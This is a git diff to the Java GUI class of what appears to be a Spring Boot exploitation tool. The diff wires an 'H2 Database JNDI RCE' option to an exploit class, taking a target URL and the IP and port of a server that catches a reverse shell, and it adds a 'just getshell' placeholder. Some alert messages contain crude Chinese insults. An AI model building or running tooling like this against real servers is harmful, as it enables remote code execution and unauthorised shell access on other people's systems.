@@ -594,8 +594,38 @@ public class springboot_vul extends Application {
                         }
                 }
         }
-        public void handlerH2DatabaseJNDIRCE(String address,String command){
-
+        public void handlerH2DatabaseJNDIRCE(String address,String vpsIP,String vpsPORT){
+                consoleOutput.getChildren().clear();
+                if (address.isEmpty()){
+                        showAlertEmpty("地址为空！");
+                }else {
+                        if (address.endsWith("/")) {
+                                address = address.replaceAll("/$", "");
+                        }
+                        if (!address.startsWith("http://") && !address.startsWith("https://")) {
+                                address = "http://" + address;
+                        }
+                        if (vpsIP.isEmpty() && vpsPORT.isEmpty()) {
+                                showAlertEmpty("反弹vps的IP和端口为空！");
+                        } else {
+                                H2DataConsoleRCE hc = new H2DataConsoleRCE(address,vpsIP,vpsPORT);
+                                hc.Exp(new ResultCallback() {
+                                        @Override
+                                        public void onResult(String result) {
+                                                Platform.runLater(() -> {
+                                                        // 输出其他内容到控制台
+                                                        Text text = new Text(result + "\n");
+                                                        consoleOutput.getChildren().add(text);
+                                                        // 自动滚动到最新内容
+                                                        scrollPane.setVvalue(1.0);
+                                                });
+                                        }
+                                        @Override
+                                        public void onComplete() {
+                                        }
+                                });
+                        }
+                }
         }
         public void handlerMysqlJdbcRCE(String address,String command){
 
@@ -825,7 +855,6 @@ public class springboot_vul extends Application {
                         if (!address.startsWith("http://") && !address.startsWith("https://")) {
                                 address = "http://" + address;
                         }
-                        System.out.println(Vulvalue);
                         switch (Vulvalue){
                                 case -1:
                                         showAlertEmpty("你踏马还没选择漏洞类型呢！");
@@ -851,7 +880,7 @@ public class springboot_vul extends Application {
                                         handlerH2DatabaseQueryRCE(address,vpsIP,vpsPort);
                                         break;
                                 case 12:
-                                        handlerH2DatabaseJNDIRCE(address, command);
+                                        handlerH2DatabaseJNDIRCE(address,vpsIP,vpsPort);
                                         break;
                                 case 13:
                                         handlerMysqlJdbcRCE(address, command);
@@ -935,7 +964,8 @@ public class springboot_vul extends Application {
                                         showAlertEmpty("你踏马还没选择漏洞类型呢！");
                                         break;
                                 case 12:
-                                        handlerH2DatabaseJNDIRCE(address, command);
+                                        showAlertEmpty("暂时没有写这里，直接getshell");
+//                                        handlerH2DatabaseJNDIRCE(address, command);
                                         break;
                                 case 13:
 //                                        handlerMysqlJdbcRCE(address, command);
